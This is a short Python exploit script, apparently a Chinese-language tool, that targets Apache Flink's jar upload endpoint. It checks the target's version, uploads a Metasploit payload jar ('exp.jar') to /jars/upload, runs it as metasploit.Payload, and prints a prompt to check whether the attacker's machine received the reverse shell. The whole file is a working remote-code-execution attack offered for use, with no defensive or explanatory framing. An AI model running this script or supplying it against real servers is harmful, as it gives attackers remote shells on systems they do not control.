import requests
import warnings
import sys
import re



def vulattack(ip):
    data1 = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "entryClass": "metasploit.Payload",
        "parallelism": "null",
        "programArgs": "null",
        "savepointPath": "null",
        "allowNonRestoredState": "null"
}

    files = {'file': open("exp.jar", 'rb')}
    response = requests.post(url=ip + "/jars/upload", files=files,verify=False,timeout=30)
    jar = response.text.split("flink-web-upload/")[1].split('",')[0]
    print(jar)
    payload = "/jars/{}/run?entry-class=metasploit.Payload".format(jar)
    print("请查看攻击机是否接收到反弹shell")
    try:
        r = requests.post(url=ip + payload, headers=data1)
    except Exception as e:
        print("上传失败")
        print(e)




def version_check(i):
    try:
        res = requests.get(i+"/config", timeout=15, verify=False)
        version = re.findall(r'"flink-version":"(.*?)","', res.text)[0]
        list1 = version.split('.')
        if int(list1[1]) <= 11:
            print("\033[0;32;40m[+] {} {} 该版本疑似存在漏洞！！！\033[0;32;40m".format(i,version))
            print("文件上传中······",end="  ")
            vulattack(ip)
        else:
            print("\033[0;31;40m[-] {} {} 该版本不存在漏洞\033[0m".format(i,version))
    except Exception as e:
        print("[x] {} 访问出错".format(i))
        print(e)
       
banner="""
 ______   _ _   _ _             
|  ____| (_) \ | (_)            
| |__ ___ _|  \| |_  __ _  ___  
|  __/ _ \ | . ` | |/ _` |/ _ \ 
| | |  __/ | |\  | | (_| | (_) |
|_|  \___|_|_| \_|_|\__,_|\___/ 
                version:1.8
                
Apache-Flink文件上传getshell漏洞利用脚本
                
"""

warnings.filterwarnings("ignore")

print(banner)

ip = sys.argv[2]

version_check(ip)



